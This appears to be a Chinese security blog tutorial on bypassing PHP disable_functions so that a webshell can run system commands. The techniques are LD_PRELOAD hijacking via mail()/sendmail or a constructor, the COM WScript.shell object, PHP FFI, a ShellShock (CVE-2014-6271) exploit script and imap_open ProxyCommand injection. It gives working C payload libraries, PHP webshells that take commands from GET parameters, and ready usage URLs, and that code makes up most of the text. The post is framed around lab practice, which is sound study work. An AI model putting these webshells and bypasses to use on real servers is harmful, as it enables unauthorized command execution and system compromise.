<p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。那么我们在利用LD_PRELOAD环境变量去劫持getuid(),再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了</p>
<p>攻击前提：在Linux中已安装并启用sendmail程序。</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004160745506.png" alt="image-20211004160745506"></p>
<p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数（mail）</p>
<p>因为我们用的是getuid的函数，可以查看一下</p>
<pre><code>readelf -Ws /usr/sbin/sendmail | grep "getuid"</code></pre><p>创建test.c (获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由system函数获取的系统命令)</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
        <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当共享库里面的getuid函数被调用了，那么就会去执行system函数</p>
<p>接着编译一下</p>
<pre><code>gcc -c -fPIC test.c -o exp&amp;&amp;gcc -shared exp -o exp.so</code></pre><p>把.so文件上传到服务器，并且写一个webshell  </p>
<p>test.php</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p>";</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span> 
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>cmd是我们要执行的参数，outpath输出的路径，sopath是我们的动态链接库</p>
<p>哎。。又磨了一下午没磨出来</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004163842159.png" alt="image-20211004163842159"></p>
<p>一直显示500.sendmail也安装了，访问路径下别的都行，就是这个php不行,等有空再钻研一下</p>
<p>但是方法就是那么一个方法，有师傅成功了教教我。</p>
<p>缺点：因为所学的知识都是用于真实的环境，所以在真实环境中有两点</p>
<p>1.某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；</p>
<p>2.即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1  lamp、lamp.、lamp.com）</p>
<h4 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h4><p>为了不去尝试sendmail这个，GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数，</p>
<p>bypass_disablefunc.c</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span>

<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>


<span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span>

<span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// get command line options and arg</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// unset environment variable LD_PRELOAD.</span>
    <span class="token comment" spellcheck="true">// unsetenv("LD_PRELOAD") no effect on some </span>
    <span class="token comment" spellcheck="true">// distribution (e.g., centos), I need crafty trick.</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    environ<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// executive command</span>
    <span class="token function">system</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>bypass_disablefunc.php  这个跟上面的test.php一样</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p>";</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span> 
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接蚁剑上传</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004170528491.png" alt="image-20211004170528491"></p>
<p>访问目标网站</p>
<pre><code>http://xx.xx.xx.xx/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/ash&amp;sopath=/var/www/html/bypass_disablefunc_x64.so </code></pre><p>路径一定要对</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004173845745.png" alt="image-20211004173845745"></p>
<p>附上大佬的脚本<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>ps:上面的脚本是无需sendmail：巧用LD_PRELOAD突破disable_functions</p>
<p>参考:<a href="https://www.freebuf.com/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/web/192052.html</a></p>
<h3 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h3><p>windows里面的COM是系统本身就有存在的，不跟前面的php扩展一样，它是在system32下的wshom.ocx</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006133650046.png" alt="image-20211006133650046"></p>
<p>还可以在phpingo里面查看，默认是不开启的（如果没有这个组件就需要去php.ini中extension=php_com_dotnet.dll）</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006133916620.png" alt="image-20211006133916620"></p>
<p>因为是0，所以我们就需要去php.ini中开启</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134051115.png" alt="image-20211006134051115"></p>
<p>然后再去查看就能看到0变成了1</p>
<p>剩下的就跟前面讲过的黑名单绕过里面com一样</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 生成一个COM对象　Shell.Application也能</span>
<span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c"</span><span class="token punctuation">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用对象方法来执行命令</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134719919.png" alt="image-20211006134719919"></p>
<h3 id="利用PHP-7-4-FFI绕过"><a href="#利用PHP-7-4-FFI绕过" class="headerlink" title="利用PHP 7.4 FFI绕过"></a>利用PHP 7.4 FFI绕过</h3><p>什么是FFI：外部函数接口。可以让用户在php里面调用c代码</p>
<p>条件：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP &gt;= 7.4</li>
<li>开启了 FFI 扩展且 ffi.enable=true</li>
</ul>
<p>去php.ini中开启FFI</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190125969.png" alt="image-20211006190125969"></p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190202162.png" alt="image-20211006190202162"></p>
<p>成功开启</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006190234944.png" alt="image-20211006190234944"></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$cmd > /tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当然主要是因为FFI:cdef这个函数的作用</p>
<pre><code>$ffi = FFI::cdef("int system(const char *command);"); //声明了c语言中的system函数</code></pre><p>然后再是</p>
<pre><code>$ffi-&gt;system("$cmd &gt; /tmp/ash"); //通过GET传递的命令去执行</code></pre><p>因为输入的命令是没有回显，所以我们就需要去写进一个可读可写的路径下，就利用了</p>
<pre><code>echo file_get_contents("/tmp/ash");</code></pre><p>实验就采取了<a href="https://github.com/AntSwordProject/AntSword-Labs" target="_blank" rel="noopener">AntSword-Labs</a>的环境</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193113632.png" alt="image-20211006193113632"></p>
<p>连接密码ant</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193232361.png" alt="image-20211006193232361"></p>
<p>然后把上面的php代码上传上去</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193902614.png" alt="image-20211006193902614"></p>
<p>蚁剑也有绕过的插件，也可以用这个方法，因为我蚁剑的插件半天加载不来，借用了一下靶场的图</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006194625845.png" alt="image-20211006194625845"></p>
<h3 id="利用-ShellShock-CVE-2014-6271"><a href="#利用-ShellShock-CVE-2014-6271" class="headerlink" title="利用 ShellShock (CVE-2014-6271)"></a>利用 ShellShock (CVE-2014-6271)</h3><p>前提条件：</p>
<ul>
<li>Linux 操作系统，php &lt; 5.6.2</li>
<li><code>putenv</code>，<code>mail</code> or <code>error_log</code> 但是在AntSword-Labs禁用了 <code>mail</code> 但未禁用 <code>error_log</code></li>
<li><code>/bin/bash</code> 存在 <code>CVE-2014-6271</code> 漏洞</li>
<li><code>/bin/sh -&gt; /bin/bash</code> sh 默认的 shell 是 bash</li>
</ul>
<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>什么是Bash Shellshock 破壳漏洞：在bash中有一个独特的方法就是通过环境变量去定义函数，而导致该漏洞出现的原因就是字符串 <code>() {</code> 的格式作为开头， 那么该变量就会被当前 Bash 当作一个导出函数( <code>export function</code> ) , 该函数仅会在当前 Bash 的子进程中生效。【注意()和{中间有一个空格】。在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
<p>同时一般函数体内的代码不会被执行，但破壳漏洞会错误的将”{}”花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令</p>
<p>bash破击漏洞前提条件：</p>
<ul>
<li>被攻击的bash存在漏洞（版本小于等于4.3）</li>
<li>攻击者可以控制环境变量</li>
<li>新的bash进程被打开触发漏洞并执行命令</li>
</ul>
<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>简单判断是否存在bash破击漏洞</p>
<pre><code>env x='() { :;}; echo vulnerable' bash -c "echo ash"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006200509265.png" alt="image-20211006200509265"></p>
<p>当出现了vulnerable，说明存在漏洞</p>
<p>当然AntSword-Labs的环境也禁用了很多函数，而蚁剑 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可<img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006203545431.png" alt="image-20211006203545431"></p>
<p>而查看进程</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006204438012.png" alt="image-20211006204438012"></p>
<p> PHP <code>error_log</code> 函数在执行 <code>sh -c -t -i</code>时就会触发Bash 的 ShellShock 漏洞，从而任意的命令执行</p>
<p>这个靶场的环境的根目录有一个flag的文件，直接打开是读取不了的，并且每次执行命令都会在tmp目录下生成一个as开头的文件</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006203947814.png" alt="image-20211006203947814"></p>
<p>直接取读cat是不行的，用tac就可以</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006204233635.png" alt="image-20211006204233635"></p>
<p>或者手动使用脚本exp</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token shell-comment comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span>
<span class="token shell-comment comment"># Google Dork: none </span>
<span class="token shell-comment comment"># Date: 10/31/2014 </span>
<span class="token shell-comment comment"># Exploit Author: Ryan King (Starfall) </span>
<span class="token shell-comment comment"># Vendor Homepage: http:</span><span class="token comment" spellcheck="true">//php.net </span>
<span class="token shell-comment comment"># Software Link: http:</span><span class="token comment" spellcheck="true">//php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span>
<span class="token shell-comment comment"># Version: 5.* (tested on 5.6.2) </span>
<span class="token shell-comment comment"># Tested on: Debian 7 and CentOS 5 and 6 </span>
<span class="token shell-comment comment"># CVE: CVE-2014-6271 </span>

<span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Execute a command via CVE-2014-6271 @mail.c:283 </span>
   <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token comment" spellcheck="true">// In Safe Mode, the user may only alter environment variableswhose names </span>
   <span class="token comment" spellcheck="true">// begin with the prefixes supplied by this directive. </span>
   <span class="token comment" spellcheck="true">// By default, users will only be able to set environment variablesthat </span>
   <span class="token comment" spellcheck="true">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>
   <span class="token comment" spellcheck="true">// PHP will let the user modify ANY environment variable! </span>
   <span class="token comment" spellcheck="true">//mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail </span>
   <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span> 
   <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"No output, or not vuln."</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我直接上传到www的目录下就可以执行</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006205942034.png" alt="image-20211006205942034"></p>
<p>但是看别人的文章，是上传到了/var/tmp目录下通过www/html目录下的一句话，include包含了、tmp目录来执行，</p>
<p>简单说一下/var/tmp跟/tmp的区别：</p>
<ul>
<li><code>/tmp</code> 意味着存活时间短（TTL）的快速存储（可能很小）。许多系统的清理 <code>/tmp</code> 速度非常快 - 在某些系统上，它甚至可以安装为RAM磁盘。 </li>
<li><code>/var/tmp</code> 通常位于物理磁盘上，较大，可以保存较长时间的临时文件。有些系统也是干净的 <code>/var/tmp</code> - 但TTL更长。</li>
</ul>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006210559453.png" alt="image-20211006210559453"></p>
<h3 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h3><p>CVE-2018-19518  就是PHP的imap_open函数导致的任意命令执行漏洞，可以去vulhub上面复现一下。</p>
<h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a><strong>原理：</strong></h4><p><strong>imap_open也可以说是读取邮件的函数。并且这个函数是可以执行命令的</strong></p>
<p><strong>PHP 的==imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令==。该漏洞的存在是因为受影响的软件的imap_open函数在==将邮箱名称==传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器（理解为邮箱服务器）名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit</strong></p>
<p><strong>rsh和ssh的区别：</strong></p>
<p>两个节点之间的连接方式，但是ssh比rsh更加安全</p>
<p>ProxyCommand 指定用于连接服务器的命令</p>
<pre><code>ssh -oProxyCommand="echo hello|tee /tmp/executed" localhost</code></pre><p>就是在本地localhost生成一个executed文件</p>
